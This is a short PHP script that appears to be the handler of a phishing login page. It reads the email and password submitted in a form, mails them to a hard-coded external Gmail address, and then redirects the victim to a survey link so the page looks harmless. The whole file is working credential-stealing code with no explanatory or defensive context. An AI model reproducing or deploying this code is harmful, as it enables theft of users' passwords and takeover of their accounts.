<?php

$to      = 'melkamuworkineh622@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

$retval = mail($to, $subject, $message, $headers);
if( $retval == true ){
     $newURL = "https://www.surveymonkey.com/r/Y7L9ZY6";
header('Location: '.$newURL);
   }else{
      echo "Message could not be sent...";
   }


?>
